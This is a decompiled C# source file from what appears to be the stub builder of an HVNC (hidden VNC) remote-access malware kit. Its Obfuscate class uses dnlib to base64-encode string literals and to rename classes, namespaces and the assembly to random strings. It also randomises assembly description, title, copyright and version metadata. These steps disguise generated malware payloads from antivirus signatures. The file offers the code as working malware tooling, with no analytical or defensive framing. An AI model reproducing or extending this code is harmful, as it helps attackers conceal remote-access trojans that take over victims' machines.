using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace BirdBrainmofo.HVNC.StubUtils
{
	// Token: 0x020000A9 RID: 169
	internal class Obfuscate
	{
		// Token: 0x06000843 RID: 2115 RVA: 0x0005A3A4 File Offset: 0x000585A4
		public static string random_string(int length)
		{
			string text;
			do
			{
				text = new string((from string_0 in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
					select string_0[random.Next(string_0.Length)]).ToArray());
			}
			while (names.Contains(text));
			return text;
		}

		// Token: 0x06000844 RID: 2116 RVA: 0x0005A404 File Offset: 0x00058604
		public static void clean_asm(ModuleDef moduleDef_0)
		{
			foreach (TypeDef typeDef in moduleDef_0.GetTypes())
			{
				foreach (MethodDef methodDef in typeDef.Methods)
				{
					if (methodDef.HasBody)
					{
						methodDef.Body.SimplifyBranches();
						methodDef.Body.OptimizeBranches();
					}
				}
			}
		}

        // Token: 0x06000845 RID: 2117 RVA: 0x0005A4A4 File Offset: 0x000586A4
        public static void obfuscate_strings(ModuleDef moduleDef_0)
        {
            foreach (TypeDef type in moduleDef_0.GetTypes())
            {
                foreach (MethodDef method in type.Methods)
                {
                    if (!method.HasBody)
                    {
                        continue;
                    }
                    for (int i = 0; i < method.Body.Instructions.Count(); i++)
                    {
                        if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                        {
                            string text = method.Body.Instructions[i].Operand.ToString();
                            string text2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
                            Console.WriteLine(text + " -> " + text2);
                            method.Body.Instructions[i].OpCode = OpCodes.Nop;
                            method.Body.Instructions.Insert(i + 1, new Instruction(OpCodes.Call, moduleDef_0.Import(typeof(Encoding).GetMethod("get_UTF8", new Type[0]))));
                            method.Body.Instructions.Insert(i + 2, new Instruction(OpCodes.Ldstr, text2));
                            method.Body.Instructions.Insert(i + 3, new Instruction(OpCodes.Call, moduleDef_0.Import(typeof(Convert).GetMethod("FromBase64String", new Type[1] { typeof(string) }))));
                            method.Body.Instructions.Insert(i + 4, new Instruction(OpCodes.Callvirt, moduleDef_0.Import(typeof(Encoding).GetMethod("GetString", new Type[1] { typeof(byte[]) }))));
                            i += 4;
                        }
                    }
                }
            }
        }

        // Token: 0x06000846 RID: 2118 RVA: 0x0005A6F8 File Offset: 0x000588F8
        public static void obfuscate_classes(ModuleDef moduleDef_0)
		{
			foreach (TypeDef typeDef in moduleDef_0.GetTypes())
			{
				string text = random_string(10);
				Console.WriteLine("{0} -> {1}", typeDef.Name, text);
				typeDef.Name = text;
			}
		}

		// Token: 0x06000847 RID: 2119 RVA: 0x0005A76C File Offset: 0x0005896C
		public static void obfuscate_namespace(ModuleDef moduleDef_0)
		{
			foreach (TypeDef typeDef in moduleDef_0.GetTypes())
			{
				string text = random_string(10);
				Console.WriteLine("{0} -> {1}", typeDef.Namespace, text);
				typeDef.Namespace = text;
			}
		}

		// Token: 0x06000848 RID: 2120 RVA: 0x0005A7E0 File Offset: 0x000589E0
		public static void obfuscate_assembly_info(ModuleDef moduleDef_0)
		{
			string text = random_string(10);
			Console.WriteLine("{0} -> {1}", moduleDef_0.Assembly.Name, text);
			moduleDef_0.Assembly.Name = text;
			string[] array = { "AssemblyDescriptionAttribute", "AssemblyTitleAttribute", "AssemblyProductAttribute", "AssemblyCopyrightAttribute", "AssemblyCompanyAttribute", "AssemblyFileVersionAttribute" };
			foreach (CustomAttribute customAttribute in moduleDef_0.Assembly.CustomAttributes)
			{
				if (array.Any(customAttribute.AttributeType.Name.Contains))
				{
					string text2 = random_string(10);
					Console.WriteLine("{0} = {1}", customAttribute.AttributeType.Name, text2);
					customAttribute.ConstructorArguments[0] = new CAArgument(moduleDef_0.CorLibTypes.String, new UTF8String(text2));
				}
			}
		}

		// Token: 0x06000849 RID: 2121 RVA: 0x0005A904 File Offset: 0x00058B04
		public static ModuleDefMD obfuscate(ModuleDefMD moduleDefMD_0)
		{
			moduleDefMD_0.Name = random_string(10);
			obfuscate_strings(moduleDefMD_0);
			obfuscate_classes(moduleDefMD_0);
			obfuscate_namespace(moduleDefMD_0);
			obfuscate_assembly_info(moduleDefMD_0);
			clean_asm(moduleDefMD_0);
			return moduleDefMD_0;
		}

		// Token: 0x0600084A RID: 2122 RVA: 0x00006F52 File Offset: 0x00005152
		public Obfuscate()
		{
		}

		// Token: 0x0600084B RID: 2123 RVA: 0x0000A9E7 File Offset: 0x00008BE7
		// Note: this type is marked as 'beforefieldinit'.
		static Obfuscate()
		{
		}

		// Token: 0x0600084C RID: 2124 RVA: 0x0000A9FD File Offset: 0x00008BFD
/*
		object method_0(string string_0, Type[] type_0)
		{
			return GetMethod(string_0, type_0);
		}
*/

		// Token: 0x04000678 RID: 1656
		private static Random random = new Random();

		// Token: 0x04000679 RID: 1657
		private static List<string> names = new List<string>();

		// Token: 0x020000AA RID: 170
		[CompilerGenerated]
		[Serializable]
		private sealed class cccc
		{
			// Token: 0x0600084D RID: 2125 RVA: 0x0000AA07 File Offset: 0x00008C07
			// Note: this type is marked as 'beforefieldinit'.
			static cccc()
			{
			}

			// Token: 0x0600084E RID: 2126 RVA: 0x00006F52 File Offset: 0x00005152
			public cccc()
			{
			}

			// Token: 0x0600084F RID: 2127 RVA: 0x0000AA13 File Offset: 0x00008C13
			internal char random_string_2_0(string string_0)
			{
				return string_0[random.Next(string_0.Length)];
			}

			// Token: 0x0400067A RID: 1658
			public static readonly Obfuscate.cccc ccc9 = new Obfuscate.cccc();

			// Token: 0x0400067B RID: 1659
			public static Func<string, char> ccc9__2_0;
		}
	}
}
